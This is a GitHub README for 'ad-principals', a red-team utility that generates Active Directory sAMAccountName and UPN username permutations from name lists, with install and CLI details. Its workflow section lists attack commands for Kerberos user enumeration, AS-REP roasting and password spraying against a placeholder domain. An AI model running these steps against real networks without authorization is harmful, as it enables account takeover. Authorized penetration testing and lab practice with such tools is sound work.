# ad-principals

[![Build and Release](https://github.com/nobody-Justheader//ad-principals/actions/workflows/release.yml/badge.svg)](https://github.com/nobody-Justheader//ad-principals/actions/workflows/release.yml)

**ad-principals** is a lightweight, standalone Python utility designed for Red Teamers and Security Auditors to generate Active Directory `sAMAccountName` and `UserPrincipalName` (UPN) permutations from raw name lists.

It is specifically optimized for identifying valid domain principals during the enumeration phase of an internal assessment or an Active Directory lab (e.g., Hack The Box, TryHackMe).

---

## Features
- **Universal AD Compatibility**: 
  - Uses **64-character** limit (UserPrincipalName standard)
  - Usernames ≤20 chars work for both sAMAccountName (legacy) and UPN (modern)
  - Usernames 21-64 chars work for UPN environments
  - Maximum coverage without configuration
- **Smart Symbol Handling**: 
  - SAM mode: Allows letters, numbers, `.`, `-`, `_`
  - UPN mode: Additionally allows `!`, `#`, `^`, `~`, `'`
  - Automatically sanitizes invalid characters (apostrophes, special chars)
- **Flexible Input**: Native support for `.txt` (raw names) and `.csv` (auto-detects 'Name' or 'Full Name' columns)
- **Extensive Format Coverage**: Generates **30+ username variations** including:
  - Standard formats: `jsmith`, `jane.smith`, `smith.j`
  - Separator variations: `jane_smith`, `jane-smith`
  - Reverse formats: `smithj`, `smith.jane`
  - Initial combinations: `jm`, `mj`, `j.m`
- **Optional Red Herring Variations** (opt-in):
  - Numbered suffixes: `jsmith1`, `jsmith2` (for collision detection)
  - Year-based: `jsmith2024`, `jsmith24`
  - Admin accounts: `jsmith-admin`, `jsmith_adm`
  - Location codes: `jsmith.nyc`, `jsmith.lon`

---

## Installation

### Option 1: Pre-compiled Binary (Recommended)

Download the latest standalone binary from the [**Releases**](https://github.com/nobody-Justheader//ad-principals/releases) tab:

```bash
chmod +x ad-principals
sudo mv ad-principals /usr/local/bin/
ad-principals -i names.txt
```

**Verify integrity (SHA256):**
```bash
# Latest checksum: CHECKSUM_PLACEHOLDER
echo "CHECKSUM_PLACEHOLDER  ad-principals" | sha256sum -c -
```

### Option 2: From Source

```bash
git clone https://github.com/nobody-Justheader//ad-principals.git
cd ad-principals
pip3 install -r requirements.txt
python3 ad-principals.py -i names.txt
```

### Global Installation

```bash
chmod +x ad-principals.py
sudo ln -s $(pwd)/ad-principals.py /usr/local/bin/ad-principals
# Now use as: ad-principals -i names.txt
```

---

## Usage

### Basic Usage

```bash
python3 ad-principals.py -i employees.txt
```

### Advanced Options

```bash
# Include numbered variations for collision detection
python3 ad-principals.py -i names.txt --with-numbers --max-num 5

# Include year-based suffixes
python3 ad-principals.py -i names.txt --with-years

# Add admin account variations
python3 ad-principals.py -i names.txt --with-admin

# Add location-based suffixes
python3 ad-principals.py -i names.txt --locations nyc,lon,sfo

# Full red teaming mode (all variations)
python3 ad-principals.py -i names.txt --with-numbers --with-years --with-admin --locations nyc,lon
```

### CLI Options

| Option | Description |
|--------|-------------|
| `-i, --input` | Input file (TXT or CSV) **[required]** |
| `-o, --output` | Custom output file path |
| `--with-numbers` | Include numbered suffixes (e.g., `jsmith1`, `jsmith2`) |
| `--with-years` | Include year-based suffixes (e.g., `jsmith2024`, `jsmith24`) |
| `--with-admin` | Include admin variations (e.g., `jsmith-admin`) |
| `--max-num N` | Maximum number suffix when `--with-numbers` enabled (default: 3) |
| `--locations CODE1,CODE2` | Comma-separated location codes (e.g., `nyc,lon,sfo`) |

### Installation for Global Use

```bash
chmod +x ad-principals.py
sudo ln -s $(pwd)/ad-principals.py /usr/local/bin/ad-principals
# Now use as: ad-principals -i names.txt
```

---

## 🔄 Integration Workflow

This tool is designed to be the first step in your AD attack chain:

### 1. Generate Username Permutations

```bash
# Basic enumeration (clean list)
python3 ad-principals.py -i employees.txt

# Thorough enumeration (with collision detection)
python3 ad-principals.py -i employees.txt --with-numbers --max-num 3
```

### 2. Enumerate Valid Users with Kerbrute

```bash
./kerbrute userenum -d CORP.local --dc 10.10.10.10 employees_principals.txt
```

### 3. Exploit Valid Accounts

```bash
# AS-REP Roasting (accounts without Kerberos pre-auth)
GetNPUsers.py CORP.local/ -usersfile valid_users.txt -dc-ip 10.10.10.10

# Password spraying with common passwords
kerbrute passwordspray -d CORP.local valid_users.txt 'Welcome2024!'
```

---

## 📊 Output Statistics

**Default mode** (no flags):
- **~27 variations** per name
- Focus on realistic corporate formats

**With `--with-numbers --max-num 3`**:
- **~130+ variations** per name
- Includes collision detection patterns

**Full red team mode** (all flags):
- **200+ variations** per name
- Comprehensive coverage but slower enumeration

---

## 📜 Disclaimer

This tool is for educational and ethical security testing purposes only. Use it only on systems you have explicit permission to test. The author is not responsible for any misuse of this tool.

---

Made with :heart: and VibeCoding
